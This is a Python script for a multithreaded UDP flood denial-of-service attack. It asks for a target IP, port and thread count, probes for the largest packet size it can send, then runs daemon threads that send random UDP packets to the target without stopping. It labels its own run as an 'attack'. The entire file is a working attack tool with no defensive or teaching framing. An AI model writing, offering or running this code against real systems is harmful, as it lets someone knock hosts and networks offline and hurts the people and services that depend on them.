import socket
import random
import threading
import os
import time

def create_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        # Request a huge buffer size
        desired_size = 1024 * 1024 * 1024  # 1 GB
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, desired_size)

        # Read the actual size the OS allowed
        actual_size = sock.getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)
        print(f"[+] Requested send buffer: {desired_size // 1024 // 1024} MB")
        print(f"[+] Actual send buffer set: {actual_size // 1024} KB")
    except Exception as e:
        print(f"[!] Could not set send buffer: {e}")

    return sock

def detect_max_udp_payload(ip, port, max_limit=65507):
    print(f"[+] Probing {ip}:{port} for max UDP payload...")
    test_sock = create_socket()
    for size in range(512, max_limit + 1, 512):
        try:
            test_sock.sendto(random._urandom(size), (ip, port))
        except OSError:
            test_sock.close()
            print(f"[!] Max packet size before failure: {size - 512} bytes")
            return size - 512
    test_sock.close()
    print(f"[+] Max safe size detected: {max_limit} bytes")
    return max_limit

def udp_flood(ip, port, packet_size, thread_id):
    sock = create_socket()
    packet = random._urandom(packet_size)
    sent = 0
    while True:
        try:
            sock.sendto(packet, (ip, port))
            sent += 1
            if sent % 10000 == 0:
                print(f"[Thread {thread_id}] Sent {sent} packets to {ip}:{port}")
        except Exception as e:
            print(f"[Thread {thread_id}] Error: {e}")
            break

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    ip = input("Target IP: ").strip()
    port = int(input("Target Port: ").strip())
    thread_count = int(input("Number of Threads: ").strip())

    packet_size = detect_max_udp_payload(ip, port)
    print(f"[+] Using packet size: {packet_size} bytes\n")
    time.sleep(1)

    threads = []
    try:
        for i in range(thread_count):
            t = threading.Thread(target=udp_flood, args=(ip, port, packet_size, i + 1), daemon=True)
            t.start()
            threads.append(t)

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")
        os._exit(0)

if __name__ == "__main__":
    main()